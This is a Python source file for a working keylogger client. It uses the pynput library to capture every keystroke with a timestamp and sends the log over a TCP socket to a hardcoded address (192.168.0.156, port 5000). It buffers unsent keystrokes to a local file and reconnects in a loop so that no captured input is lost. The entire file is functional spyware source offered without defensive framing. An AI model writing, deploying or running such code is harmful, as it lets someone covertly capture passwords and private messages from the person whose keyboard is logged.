import socket
import time
import queue
from datetime import datetime
from pathlib import Path
from pynput import keyboard

# Thread-safe queue for keystrokes
key_queue = queue.Queue()

# Buffer file path
def get_buffer_path(host: str, port: int) -> Path:
    return Path(f".client_buffer_{host}_{port}.txt".replace(":", "_"))

# Append unsent data to buffer
def append_to_buffer(buffer_path: Path, msg: str) -> None:
    buffer_path.parent.mkdir(parents=True, exist_ok=True)
    with buffer_path.open("a", encoding="utf-8", newline="\n") as f:
        f.write(f"{msg}\n")
        f.flush()

# Flush buffered data when connection is restored
def flush_buffer(buffer_path: Path, sock: socket.socket) -> None:
    if not buffer_path.exists():
        return

    lines = buffer_path.read_text(encoding="utf-8", errors="replace").splitlines()
    if not lines:
        buffer_path.unlink(missing_ok=True)
        return

    sent_upto = 0
    try:
        for i, line in enumerate(lines):
            msg = line.strip()
            if not msg:
                sent_upto = i + 1
                continue
            sock.sendall(f"{msg}\n".encode("utf-8"))
            sent_upto = i + 1
    except (ConnectionError, OSError):
        remaining = [ln for ln in lines[sent_upto:] if ln.strip()]
        if remaining:
            buffer_path.write_text("\n".join(remaining) + "\n", encoding="utf-8", newline="\n")
        else:
            buffer_path.unlink(missing_ok=True)
        raise

    buffer_path.unlink(missing_ok=True)

# Background keylogger
def start_keylogger():
    IGNORED_KEYS = {
        "[Key.shift]", "[Key.ctrl_l]", "[Key.ctrl_r]", "[Key.alt_l]", "[Key.alt_r]"
    }

    def on_press(key):
        try:
            k = key.char
        except AttributeError:
            k = f"[{key}]"

        if k in IGNORED_KEYS:
            return

        log_entry = f"{datetime.now()} - {k}"
        key_queue.put(log_entry)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keylogger started in background thread...")

# Main client loop
def run(host: str = "192.168.0.156", port: int = 5000) -> None:
    buffer_path = get_buffer_path(host, port)

    # Start background keylogger
    start_keylogger()

    while True:
        try:
            with socket.create_connection((host, port), timeout=10) as s:
                print(f"Connected to {host}:{port}")

                # Send any buffered data first
                flush_buffer(buffer_path, s)

                while True:
                    try:
                        msg = key_queue.get(timeout=1)
                    except queue.Empty:
                        continue

                    try:
                        s.sendall(f"{msg}\n".encode("utf-8"))
                        print(f"Sent: {msg}")
                    except (ConnectionError, OSError) as e:
                        append_to_buffer(buffer_path, msg)
                        print(f"Send failed ({e}); buffered message and reconnecting...")
                        time.sleep(2)
                        break

        except (ConnectionError, OSError) as e:
            print(f"Connection failed ({e}); retrying in 10s...")
            time.sleep(10)

# Entry point
if __name__ == "__main__":
    run()